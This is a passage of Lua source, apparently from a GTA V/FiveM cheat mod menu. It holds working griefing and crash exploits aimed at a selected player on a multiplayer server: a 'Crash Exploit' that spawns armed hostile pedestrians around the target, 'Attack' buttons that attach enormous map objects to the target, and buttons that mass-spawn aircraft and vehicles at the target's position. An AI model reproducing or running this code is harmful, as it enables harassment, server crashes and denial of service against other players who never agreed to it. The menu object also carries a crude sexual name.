                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_COMBATPISTOL'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
           elseif IhadSexWithMyStepMother.Button('Crash Exploit 7') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('mp_f_freemode_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_PISTOL_MK2'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
										end
			 elseif IhadSexWithMyStepMother.IsMenuOpened('troll') then
			 if IhadSexWithMyStepMother.Button('~r~!!Spawn All Objects on him!!') then
                                        local hamburg = "cs1_lod2_01_7_slod3"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ar_prop_ar_cp_tower8x_01a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "stt_prop_stunt_track_start"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "stt_prop_stunt_tube_m"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ar_prop_ar_arrow_wide_xl"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ar_prop_ar_neon_gate4x_01a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "prop_container_01a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ap1_lod_slod4"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "csx_seabed_rock3_"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "prop_cj_big_boat"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "cs4_lod_01_slod3"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "dt1_lod_f1_slod3"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "dt1_21_reflproxy"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "dt1_props_combo0110_slod"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "dt1_11_slod1"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "sc1_08_hdg1"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ss1_11_slod"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ar_prop_ar_bblock_huge_05"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ar_prop_ar_neon_gate4x_03a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "ar_prop_ar_tube_2x_speed"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                        local hamburg = "apa_mp_apa_yacht_option2"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)

			elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Paleto Bay') then
                                        local hamburg = "cs1_lod2_01_7_slod3"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Tower 8X') then
                                        local hamburg = "ar_prop_ar_cp_tower8x_01a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Wall') then
                    local hamburg = "stt_prop_stunt_track_start"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Tube') then
                    local hamburg = "stt_prop_stunt_tube_m"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Arrow') then
                    local hamburg = "ar_prop_ar_arrow_wide_xl"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Gat 4X') then
                    local hamburg = "ar_prop_ar_neon_gate4x_01a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Contanier') then
                    local hamburg = "prop_container_01a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~AirPort') then
                    local hamburg = "ap1_lod_slod4"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Sea Rock') then
										local hamburg = "csx_seabed_rock3_"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                    AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Boat') then
                                    local hamburg = "prop_cj_big_boat"
                                    local hamburghash = GetHashKey(hamburg)
                                    local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                            elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Sandy Shores Map') then
                                local hamburg = "cs4_lod_01_slod3"
                                local hamburghash = GetHashKey(hamburg)
                                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                        elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Los Santos City') then
                            local hamburg = "dt1_lod_f1_slod3"
                            local hamburghash = GetHashKey(hamburg)
                            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~All Map') then
                        local hamburg = "dt1_21_reflproxy"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~FBI') then
                    local hamburg = "dt1_props_combo0110_slod"
                    local hamburghash = GetHashKey(hamburg)
                    local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~MazeBank') then
                local hamburg = "dt1_11_slod1"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
        elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Hospital') then
            local hamburg = "sc1_08_hdg1"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
    elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Rich House') then
        local hamburg = "ss1_11_slod"
        local hamburghash = GetHashKey(hamburg)
        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
    AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
							
			elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Big Heli 20x') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 1, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 2, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 3, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 4, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 5, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 6, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 7, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 8, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 9, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 10, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 11, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 12, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 13, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 14, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 15, 0)
                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 16, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Cars 20x') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('exemplar'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('exemplar'), 1, 0)
                    local pickup = CreateObject(GetHashKey('windsor2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('windsor2'), 2, 0)
                    local pickup = CreateObject(GetHashKey('jackal'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('jackal'), 3, 0)
                    local pickup = CreateObject(GetHashKey('oracle'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('oracle'), 4, 0)
                    local pickup = CreateObject(GetHashKey('blista'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('blista'), 5, 0)
                    local pickup = CreateObject(GetHashKey('prairie'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('prairie'), 6, 0)
                    local pickup = CreateObject(GetHashKey('felon2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('felon2'), 7, 0)
                    local pickup = CreateObject(GetHashKey('riot'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('riot'), 8, 0)
                    local pickup = CreateObject(GetHashKey('riot2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('riot2'), 9, 0)
                    local pickup = CreateObject(GetHashKey('ambulance'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('ambulance'), 10, 0)
                    local pickup = CreateObject(GetHashKey('firetruk'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('firetruk'), 11, 0)
                    local pickup = CreateObject(GetHashKey('pbus'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('pbus'), 12, 0)
                    local pickup = CreateObject(GetHashKey('chino'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('chino'), 13, 0)
                    local pickup = CreateObject(GetHashKey('chino2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('chino2'), 14, 0)
                    local pickup = CreateObject(GetHashKey('moonbeam2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('moonbeam2'), 15, 0)
                    local pickup = CreateObject(GetHashKey('imperator'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('imperator'), 16, 0)
                    SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Another Big Plane 20x') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 1, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 2, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 3, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 4, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 5, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 6, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 7, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 8, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 9, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 10, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 11, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 12, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 13, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 14, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 15, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 16, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 17, 0)
                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 18, 0)
                    SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Cargoplane 20x') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 2, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 3, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 4, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 5, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 6, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 7, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 8, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 11, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 12, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 13, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 14, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 15, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 16, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 17, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 18, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 19, 0)
                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 20, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Police Cars 20x') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
                    CreateObject(GetHashKey('ambulance'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('ambulance'), 1, 0)
                    CreateObject(GetHashKey('fbi'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('fbi'), 2, 0)
                    CreateObject(GetHashKey('fbi2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('fbi2'), 3, 0)
                    CreateObject(GetHashKey('firetruk'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('firetruk'), 4, 0)
